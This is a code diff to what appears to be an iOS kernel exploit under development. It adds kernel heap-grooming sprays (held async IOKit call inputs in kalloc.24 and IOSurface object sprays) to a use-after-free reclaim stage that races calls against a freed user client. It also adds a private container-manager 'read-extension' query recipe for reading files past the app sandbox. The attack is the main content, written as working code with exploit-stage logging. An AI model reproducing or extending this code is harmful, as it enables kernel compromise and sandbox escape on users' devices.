@@ -767,6 +767,9 @@ static void stageE7(int shape) {
 // the Mach-O/IM4P structure); the full pull is a follow-up module.
 // ---------------------------------------------------------------------------
 static int64_t sbxRead(const char *path) {
+    // the PROVEN bqX recipe on this device: g=1 (app group), flag=0x800000000,
+    // part=0, depth=1.  The class + flags calls are NOT optional - without them
+    // get_single_result returns NULL (the -4 the first phase-3 run logged).
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
     if (!mgr) return -1;
     typedef void *(*qc)(void);
@@ -779,6 +782,8 @@ static int64_t sbxRead(const char *path) {
     typedef int64_t (*ce)(const char *);
     qc qcreate = (qc)dlsym(mgr, "container_query_create");
     qg qgids  = (qg)dlsym(mgr, "container_query_set_group_identifiers");
+    qp qclass = (qp)dlsym(mgr, "container_query_set_class");
+    qp qflags = (qp)dlsym(mgr, "container_query_operation_set_flags");
     qp qpart  = (qp)dlsym(mgr, "container_query_operation_set_part");
     qd qdom   = (qd)dlsym(mgr, "container_query_operation_set_part_domain");
     qr qres   = (qr)dlsym(mgr, "container_query_get_single_result");
@@ -791,7 +796,9 @@ static int64_t sbxRead(const char *path) {
     NSString *grp = [NSString stringWithFormat:@"group.%@", [[NSBundle mainBundle] bundleIdentifier]];
     void *q = qcreate();
     if (!q) { dlclose(mgr); return -3; }
-    qgids(q, xpc_string_create(grp.UTF8String));
+    if (qclass) qclass(q, 7);                    // group-container query
+    if (qgids)  qgids(q, xpc_string_create(grp.UTF8String));
+    if (qflags) qflags(q, 0x800000000ULL);       // the read-extension flag
     qpart(q, 0);
     char dom[512];
     snprintf(dom, sizeof dom, "%s%s", path[0] == '/' ? "../" : "", path);
@@ -1300,6 +1307,63 @@ static void oolFree(void) {
     gSprayN = 0;
 }
 
+// holdGroom: async sel17 calls whose input carries the canary and whose
+// wakeports are NEVER destroyed - the kernel keeps the 24-byte input copy
+// alive in kalloc.24 while the reply sits in the queue.  This is a content-
+// and size-controlled kernel spray that cannot fail the way a complex mach
+// message can, and kalloc.24 is exactly the zone the panic's faulting
+// pointer lives in (registry entry / small request structs).
+static mach_port_t gHoldPorts[512];
+static uint64_t gHoldIds[512];
+static int gHoldN = 0;
+
+static void holdFree(void) {
+    for (int i = 0; i < gHoldN; i++) dropPort(gHoldPorts[i]);
+    gHoldN = 0;
+}
+
+static int holdGroom(int n, uint32_t tag) {
+    holdFree();
+    if (n > 200) n = 200;
+    if (!gGroomConn && IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) != KERN_SUCCESS) {
+        gGroomConn = 0; return 0;
+    }
+    uint64_t ref = 0xA1B2C3D4E5F60708ull;
+    for (int i = 0; i < n && gHoldN < 512; i++) {
+        mach_port_t wp = newWakePort();
+        if (!wp) break;
+        uint64_t in[3] = { 0xC0FFEE5A00000000ull | (0x24ull << 16) | tag,
+                           0x1122334455667788ull, CANARY_F5 };
+        kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, SEL_REG, wp, &ref, 1,
+                                                   NULL, 0, in, 24, NULL, NULL, NULL, NULL);
+        if (r != KERN_SUCCESS) { dropPort(wp); continue; }
+        gHoldPorts[gHoldN] = wp;
+        gHoldIds[gHoldN] = in[0];
+        gHoldN++;
+    }
+    return gHoldN;
+}
+
+// surface groom: controlled-size kernel allocations (the IOSurface kext
+// allocates per-surface objects sized by the properties)
+static void *gSurfs[256];
+static int gSurfN = 0;
+static void surfGroomFree(void) {
+    for (int i = 0; i < gSurfN; i++) if (gSurfs[i]) CFRelease(gSurfs[i]);
+    gSurfN = 0;
+}
+static int surfGroom(int n) {
+    surfGroomFree();
+    if (n > 256) n = 256;
+    for (int i = 0; i < n; i++) {
+        IOSurfaceRef_ s = mkSurface();
+        if (!s) continue;
+        if (IOSurfaceGetID) (void)IOSurfaceGetID(s);
+        gSurfs[gSurfN++] = (void *)s;
+    }
+    return gSurfN;
+}
+
 static int oolSpray(int n, size_t size, uint32_t tag) {
     oolFree();
     if (n > 128) n = 128;
@@ -1310,6 +1374,7 @@ static int oolSpray(int n, size_t size, uint32_t tag) {
     size_t nq = size / 8;
     for (size_t k = 0; k < nq; k++)
         q[k] = 0xC0FFEE5A00000000ull | (((uint64_t)size & 0xffff) << 16) | tag;
+    int logged = 0;
     for (int i = 0; i < n; i++) {
         mach_port_t p = MACH_PORT_NULL;
         if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS)
@@ -1337,6 +1402,10 @@ static int oolSpray(int n, size_t size, uint32_t tag) {
         kern_return_t r = mach_msg(&m.hdr, MACH_SEND_MSG, sizeof m, 0, MACH_PORT_NULL,
                                    MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
         if (r != KERN_SUCCESS) {
+            if (logged < 3) {
+                EV("[uaf][P2] oolSpray send i=%d -> %#x", i, (uint32_t)r);
+                logged++;
+            }
             mach_port_destroy(mach_task_self(), p);
             continue;
         }
@@ -1491,10 +1560,16 @@ static void p2_unit(int u, int round) {
         gSpamConn = cs[0]; gSpamShape = 1; gSpamRun = 1;
         pthread_t th[2]; pthread_create(&th[0], NULL, spamReg, NULL);
         pthread_create(&th[1], NULL, spamReg, NULL);
-        for (int i = 0; i < 32; i++) { IOSurfaceRef_ s = mkSurface(); if (s) CFRelease(s); usleep(2000); }
+        for (int i = 0; i < 32; i++) {
+            IOSurfaceRef_ s = mkSurface();
+            if (s) CFRelease(s);
+            usleep(2000);
+        }
         gSpamRun = 0; pthread_join(th[0], NULL); pthread_join(th[1], NULL);
+        EV("[uaf][P2] unit=2 round=%d surface churn done (spam=%llu)", round,
+           (unsigned long long)gSpamCount);
         for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
-        dropPort(wp); return;
+        dropPort(wp); p2Done(); return;
     }
 
     // spawn the spam: async sel17 in flight on the live connection
@@ -1518,9 +1593,16 @@ static void p2_unit(int u, int round) {
         }
     }
 
-    // the reclaim: OOL copies of size S, canary tag=round, land in the free window
+    // the reclaim: three independent kernel grooms land in the free window -
+    // (1) OOL copies of size S with the canary, (2) async sel17 INPUT copies
+    // (kalloc.24) whose wakeports we keep alive, (3) live IOSurface objects of
+    // the kext's own allocation family.  Whatever size the freed user client
+    // occupies, one of them covers it; the canary says which.
     int sprayed = oolSpray(64, (size_t)S, tag);
-    EV("[uaf][P2] unit=%d round=%d OOL reclaim sprays=%d size=%d tag=%u", u, round, sprayed, S, tag);
+    int held = holdGroom(64, tag);
+    int surfed = (u == 3 || u == 1) ? surfGroom(32) : 0;
+    EV("[uaf][P2] unit=%d round=%d reclaim: ool=%d hold=%d surf=%d size=%d tag=%u",
+       u, round, sprayed, held, surfed, S, tag);
     p2Save();
     usleep(2000);   // in-flight spam keeps calling into the freed client
 
@@ -1530,6 +1612,8 @@ static void p2_unit(int u, int round) {
 
     if (u == 3) { for (int i = 0; i < 32; i++) { IOSurfaceRef_ s = mkSurface(); if (s) CFRelease(s); } }
     oolFree();
+    holdFree();
+    surfGroomFree();
     for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
     dropPort(wp);
     p2Done();      // this round survived: the next resume starts after it
